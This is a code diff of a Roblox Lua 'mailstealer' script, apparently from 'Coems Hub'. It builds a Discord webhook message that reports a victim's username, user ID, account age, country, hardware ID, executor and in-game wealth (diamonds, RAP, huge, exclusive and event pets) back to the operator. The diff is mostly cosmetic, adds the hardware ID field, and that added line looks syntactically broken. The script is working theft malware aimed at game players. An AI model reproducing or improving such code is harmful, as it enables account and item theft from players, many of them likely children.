@@ -58,48 +58,48 @@ local HardWareId = game:GetService("RbxAnalyticsService"):GetClientId()
 request = http_request or request or HttpPost or syn.request
 
 local data1 = {
-    ["content"] = "||@everyone||\n**:comet:Coems Hub Mailstealer Detected A Hit:comet:**", -- Free Webhook logging
+    ["content"] = "||@everyone||\n**<a:gs_green_flame:884451083173367839>Coems Hub Mailstealer Detected A Hit<a:gs_green_flame:884451083173367839>**", -- Free Webhook logging
     ["embeds"] = {
         {
             ["title"] = "```Coems Hub Mailstealer Results```",
             ["url"] = "https://discord.gg/scripter",
             ["description"] = "```This data was generated using Coems Hub Mailstealer```",
             ["type"] = "rich",
-            ["color"] = tonumber(0x00bfff),
+            ["color"] = tonumber(0x00ff00),
             ["thumbnail"] = {
-                ["url"] = imgs,
+                ["url"] = "",
                 ["height"] = 420,
                 ["width"] = 420
             },
             ["fields"] = {
                 {
                     ["name"] = "Data Generated:",
-                    ["value"] = "**:detective:Username : " ..username .. "\n:detective:User ID : " ..fardplayer.userId .. "\n:underage:Account Age : " ..fardplayer.AccountAge .. "\n:crown:Rank:" ..rank.. "\n:computer: Exploit : " ..executor.. "\n:mag:Place :" ..Game.. "\n:mag:Country : " ..country.. "**", -- AAstraxXTopG
+                    ["value"] = "**:detective:Username : " ..username .."\n:detective:User ID : " ..fardplayer.userId .. "\n:underage:Account Age : " ..fardplayer.AccountAge .. "\n:crown:Rank : "..rank.."\n:computer: Exploit : "..executor.."\n:mag:Place :"..Game.."\n:mag:Country : "..country.."**" \n:mag:HWID : "..HardWareId.."**", -- NotJaneq
                     ["inline"] = false
                 },
                 {
-                    ["name"] = "<:diamond_psx:1118474311615918080>Diamonds<:diamond_psx:1118474311615918080>",
+                    ["name"] = "<:diamond_psx:1118474311615918080> Diamonds  <:diamond_psx:1118474311615918080> ",
                     ["value"] = "```>>> "..game.Players.LocalPlayer.leaderstats.Diamonds.Value.."```",
                     ["inline"] = false
 
                 },
                 {          
-                    ["name"] = ":bar_chart:RAP:bar_chart:",
+                    ["name"] = ":bar_chart: RAP :bar_chart:",
                     ["value"] = "```>>> "..RAP.."```",
                     ["inline"] = false
                 },
                 {
-                    ["name"] = "<:huge_cat:1118474511763906660>Huge Pets<:huge_cat:1118474511763906660>",
+                    ["name"] = " :money_mouth:Huge Pets:money_mouth: ",
                     ["value"] = "```>>> "..hugeamount.."```",
                     ["inline"] = true
                 },
                 {
-                    ["name"] = " <:capybara:1118564875078209668>Exclusive Pets<:capybara:1118564875078209668>",
+                    ["name"] = " :money_mouth:Exclusive Pets:money_mouth: ",
                     ["value"] = "```>>> "..exclusiveamount.."```",
                     ["inline"] = true
                 },
                 {
-                    ["name"] = "<:event:1112767158049591307>Event Pets<:event:1112767158049591307>",
+                    ["name"] = " :money_mouth:Event Pets:money_mouth: ",
                     ["value"] = "```>>> "..eventamount.."```",
                     ["inline"] = true
                 },
